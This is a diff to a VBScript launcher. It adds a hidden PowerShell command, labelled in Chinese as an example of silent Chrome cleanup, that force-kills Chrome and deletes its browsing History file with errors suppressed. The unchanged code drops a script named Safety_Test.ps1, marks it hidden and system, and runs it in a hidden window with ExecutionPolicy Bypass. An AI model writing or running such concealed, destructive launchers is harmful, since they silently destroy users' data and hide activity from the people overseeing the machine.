@@ -1,5 +1,7 @@
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set WshShell = CreateObject("WScript.Shell")
+' 在 VBS 中静默清理 Chrome 的示例命令
+WshShell.Run "powershell -WindowStyle Hidden -Command ""Stop-Process -Name chrome -Force -EA SilentlyContinue; Remove-Item '$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History' -Force -EA SilentlyContinue""", 0, False
 
 CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
 psPath = CurrentDir & "\Safety_Test.ps1"
@@ -33,6 +35,7 @@ psFile.Close
 
 fso.GetFile(psPath).Attributes = 2 + 4
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False
+
 
 
 
